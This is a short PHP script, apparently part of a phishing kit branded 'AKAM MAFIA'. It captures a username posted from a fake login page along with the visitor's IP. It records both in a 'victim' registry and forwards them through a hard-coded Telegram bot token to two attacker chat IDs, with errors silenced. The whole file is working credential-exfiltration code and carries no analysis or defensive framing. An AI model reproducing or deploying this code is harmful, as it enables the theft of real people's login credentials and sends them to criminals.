<?php
error_reporting(0);
// Ruta directa a la librería
include('../panel/lib/funciones.php');

$ip = $_SERVER['REMOTE_ADDR'];
$usuario = $_POST['usr'];

// SOLO 2 IDs para que no se trabe
$token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
$chat_ids = ["8114050673", "8518977918"];

if (!empty($usuario)) {
    @actualizar_registro($ip, "USUARIO", $usuario);
    @actualizar_estado_victima($ip, "1");
    
    $mensaje = "⭐ <b>𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - INICIO</b> ⭐\n";
    $mensaje .= "👤 <b>USUARIO:</b> <code>$usuario</code>\n";
    $mensaje .= "📍 <b>IP:</b> $ip";

    foreach ($chat_ids as $id) {
        $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$id&text=" . urlencode($mensaje) . "&parse_mode=HTML";
        @file_get_contents($url);
    }
}
echo "ok";
?>
